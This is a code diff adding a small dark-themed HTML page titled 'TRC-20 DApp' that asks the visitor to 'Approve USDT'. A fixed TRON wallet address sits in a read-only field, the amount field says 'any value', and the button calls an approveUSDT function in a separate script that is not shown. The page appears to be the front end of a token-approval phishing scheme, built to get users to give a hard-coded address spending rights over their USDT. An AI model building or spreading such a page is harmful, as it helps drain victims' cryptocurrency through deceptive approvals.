@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>TRC-20 DApp</title>
+  <style>
+    body {
+      background-color: #121212;
+      font-family: 'Arial', sans-serif;
+      color: white;
+      padding: 20px;
+      margin: 0;
+    }
+    .container {
+      max-width: 400px;
+      margin: auto;
+      background-color: #1e1e1e;
+      padding: 20px;
+      border-radius: 10px;
+    }
+    input, button {
+      width: 100%;
+      margin: 10px 0;
+      padding: 12px;
+      font-size: 16px;
+      border-radius: 8px;
+      border: none;
+    }
+    input {
+      background-color: #2c2c2c;
+      color: white;
+    }
+    button {
+      background-color: #00d2ff;
+      color: black;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Approve USDT</h2>
+    <input id="wallet" value="TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN" readonly />
+    <input id="amount" placeholder="Amount (any value)" />
+    <button onclick="approveUSDT()">Next</button>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.min.js"></script>
+  <script src="dapp.js"></script>
+</body>
+</html>
